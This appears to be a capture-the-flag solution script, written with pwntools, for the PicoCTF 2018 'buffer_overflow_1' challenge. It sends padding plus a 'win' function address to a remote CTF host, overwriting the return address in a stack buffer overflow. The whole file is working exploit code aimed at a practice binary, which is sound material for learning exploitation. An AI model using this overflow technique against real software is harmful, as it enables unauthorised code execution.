from pwn import *
#io = process("./PicoCTF_2018_buffer_overflow_1")
io = remote("node3.buuoj.cn",27682)
win_add = 0x80485CB
payload = 'a'*(0x28+4) + p32(win_add)
io.recv()
io.sendline(payload)
io.interactive()